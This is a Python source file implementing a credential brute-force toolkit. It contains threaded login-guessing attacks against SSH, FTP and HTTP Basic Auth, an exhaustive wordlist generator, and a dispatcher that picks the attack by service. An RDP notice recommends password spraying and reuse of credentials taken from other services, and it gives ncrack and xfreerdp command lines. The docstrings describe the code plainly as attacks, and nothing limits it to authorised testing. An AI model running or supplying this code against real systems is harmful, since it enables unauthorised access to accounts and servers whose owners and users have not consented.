import paramiko
import ftplib
import socket
import time
from typing import List, Tuple, Union, Optional
from concurrent.futures import ThreadPoolExecutor, as_completed

class BruteForce:
    @staticmethod
    def ssh_bruteforce(
        host: str,
        port: int = 22,
        user_list: List[str] = None,
        pass_list: List[str] = None,
        timeout: int = 3,
        max_threads: int = 5,
        delay: float = 1.0
    ) -> Union[List[Tuple[str, str]], str]:
        """
        Perform SSH brute force attack with threading and delay
        
        Args:
            host: Target host
            port: SSH port (default 22)
            user_list: List of usernames to try
            pass_list: List of passwords to try
            timeout: Connection timeout
            max_threads: Maximum concurrent threads
            delay: Delay between attempts in seconds
            
        Returns:
            List of (username, password) tuples for successful logins
            or error message string
        """
        if not user_list or not pass_list:
            return "[!] Empty username or password list"
            
        found = []
        attempts = 0
        lockout_warning = False
        
        def try_login(username: str, password: str) -> Optional[Tuple[str, str]]:
            nonlocal attempts, lockout_warning
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(
                    host,
                    port=port,
                    username=username,
                    password=password,
                    timeout=timeout,
                    banner_timeout=timeout,
                    auth_timeout=timeout
                )
                client.close()
                return (username, password)
            except paramiko.AuthenticationException:
                attempts += 1
                time.sleep(delay)  # Add delay between attempts
                return None
            except paramiko.SSHException as e:
                if "Error reading SSH protocol banner" in str(e):
                    attempts += 1
                    time.sleep(delay)
                    return None
                elif "Authentication failed" in str(e):
                    attempts += 1
                    time.sleep(delay)
                    return None
                elif "Too many authentication failures" in str(e):
                    lockout_warning = True
                    return None
                else:
                    return f"[!] SSH error for {username}:{password} - {str(e)}"
            except Exception as e:
                return f"[!] General error for {username}:{password} - {str(e)}"
        
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            futures = []
            for username in user_list:
                for password in pass_list:
                    futures.append(executor.submit(try_login, username, password))
            
            for future in as_completed(futures):
                result = future.result()
                if isinstance(result, tuple):
                    found.append(result)
                elif isinstance(result, str):
                    return result  # Return early on error
        
        if lockout_warning:
            found.append(("[!]", "Account lockout detected - stopping attack"))
        
        return found if found else "[!] No valid credentials found"

    @staticmethod
    def ftp_bruteforce(
        host: str,
        user_list: List[str] = None,
        pass_list: List[str] = None,
        timeout: int = 3,
        max_threads: int = 5,
        delay: float = 1.0
    ) -> Union[List[Tuple[str, str]], str]:
        """
        Perform FTP brute force attack with threading and delay
        
        Args:
            host: Target host
            user_list: List of usernames to try
            pass_list: List of passwords to try
            timeout: Connection timeout
            max_threads: Maximum concurrent threads
            delay: Delay between attempts in seconds
            
        Returns:
            List of (username, password) tuples for successful logins
            or error message string
        """
        if not user_list or not pass_list:
            return "[!] Empty username or password list"
            
        found = []
        attempts = 0
        
        def try_login(username: str, password: str) -> Optional[Tuple[str, str]]:
            nonlocal attempts
            try:
                ftp = ftplib.FTP(host, timeout=timeout)
                ftp.login(username, password)
                ftp.quit()
                return (username, password)
            except ftplib.error_perm:
                attempts += 1
                time.sleep(delay)  # Add delay between attempts
                return None
            except Exception as e:
                return f"[!] FTP error for {username}:{password} - {str(e)}"
        
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            futures = []
            for username in user_list:
                for password in pass_list:
                    futures.append(executor.submit(try_login, username, password))
            
            for future in as_completed(futures):
                result = future.result()
                if isinstance(result, tuple):
                    found.append(result)
                elif isinstance(result, str):
                    return result  # Return early on error
        
        return found if found else "[!] No valid credentials found"

    @staticmethod
    def rdp_bruteforce_notice() -> str:
        """Return RDP brute force notice with safer alternatives"""
        return (
            "[*] RDP Brute Force Notice:\n"
            "Direct RDP brute forcing is not recommended due to account lockout policies.\n"
            "Consider these alternatives:\n"
            "1. Password spraying with common passwords across multiple accounts\n"
            "2. Using known credentials from other services (password reuse)\n"
            "3. Using xfreerdp or ncrack with rate limiting:\n"
            "   xfreerdp /u:user /p:pass /v:target /d:domain\n"
            "   ncrack --rdp -U userlist.txt -P passlist.txt target --rate-limit 3/min"
        )

    @staticmethod
    def http_basic_bruteforce(
        url: str,
        user_list: List[str] = None,
        pass_list: List[str] = None,
        timeout: int = 5,
        max_threads: int = 5,
        delay: float = 1.0
    ) -> Union[List[Tuple[str, str]], str]:
        """
        Perform HTTP Basic Auth brute force attack
        
        Args:
            url: Target URL with basic auth
            user_list: List of usernames to try
            pass_list: List of passwords to try
            timeout: Request timeout
            max_threads: Maximum concurrent threads
            delay: Delay between attempts in seconds
            
        Returns:
            List of (username, password) tuples for successful logins
            or error message string
        """
        import requests
        from requests.auth import HTTPBasicAuth
        
        if not user_list or not pass_list:
            return "[!] Empty username or password list"
            
        found = []
        attempts = 0
        
        def try_login(username: str, password: str) -> Optional[Tuple[str, str]]:
            nonlocal attempts
            try:
                response = requests.get(
                    url,
                    auth=HTTPBasicAuth(username, password),
                    timeout=timeout
                )
                if response.status_code == 200:
                    return (username, password)
                attempts += 1
                time.sleep(delay)
                return None
            except Exception as e:
                return f"[!] HTTP error for {username}:{password} - {str(e)}"
        
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            futures = []
            for username in user_list:
                for password in pass_list:
                    futures.append(executor.submit(try_login, username, password))
            
            for future in as_completed(futures):
                result = future.result()
                if isinstance(result, tuple):
                    found.append(result)
                elif isinstance(result, str):
                    return result  # Return early on error
        
        return found if found else "[!] No valid credentials found"

    @staticmethod
    def generate_wordlist(
        min_length: int = 4,
        max_length: int = 12,
        charset: str = "abcdefghijklmnopqrstuvwxyz0123456789",
        common_words: List[str] = None
    ) -> List[str]:
        """
        Generate a basic wordlist with optional common words
        
        Args:
            min_length: Minimum password length
            max_length: Maximum password length
            charset: Character set to use
            common_words: List of common words to include
            
        Returns:
            List of generated passwords
        """
        import itertools
        
        wordlist = []
        
        # Add common words if provided
        if common_words:
            wordlist.extend(common_words)
        
        # Generate permutations
        for length in range(min_length, max_length + 1):
            for combo in itertools.product(charset, repeat=length):
                wordlist.append("".join(combo))
        
        return wordlist

    @staticmethod
    def smart_bruteforce(
        host: str,
        port: int,
        service: str,
        user_list: List[str] = None,
        pass_list: List[str] = None,
        timeout: int = 3,
        max_threads: int = 5,
        delay: float = 1.0
    ) -> Union[List[Tuple[str, str]], str]:
        """
        Smart brute force that selects appropriate method based on service
        
        Args:
            host: Target host
            port: Target port
            service: Service type (ssh, ftp, http-basic)
            user_list: List of usernames
            pass_list: List of passwords
            timeout: Connection timeout
            max_threads: Maximum threads
            delay: Delay between attempts
            
        Returns:
            List of (username, password) tuples or error message
        """
        service = service.lower()
        
        if service == "ssh":
            return BruteForce.ssh_bruteforce(
                host, port, user_list, pass_list, timeout, max_threads, delay
            )
        elif service == "ftp":
            return BruteForce.ftp_bruteforce(
                host, user_list, pass_list, timeout, max_threads, delay
            )
        elif service == "http-basic":
            return BruteForce.http_basic_bruteforce(
                f"http://{host}:{port}",
                user_list, pass_list, timeout, max_threads, delay
            )
        else:
            return f"[!] Unsupported service: {service}"
